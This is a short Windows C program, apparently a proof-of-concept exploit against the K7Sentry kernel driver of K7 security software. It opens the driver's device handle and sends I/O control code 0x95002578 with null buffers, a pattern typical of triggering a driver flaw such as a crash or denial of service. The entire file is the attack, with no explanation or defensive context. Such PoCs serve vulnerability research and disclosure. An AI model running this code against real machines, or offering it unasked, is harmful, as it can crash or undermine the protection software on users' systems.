#include "stdafx.h"
#include "targetver.h"
#include <stdio.h>
#include <tchar.h>
#include <windows.h>

int _tmain(int argc, _TCHAR* argv[])
{
	HANDLE hHandle = 0;
	DWORD nbBytes = 0;
	hHandle = CreateFileA("\\\\.\\K7Sentry", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	DeviceIoControl(hHandle, 0x95002578, (LPVOID)0, 0x0, (LPVOID)0, 0x0, &nbBytes, NULL);
	return 0;
}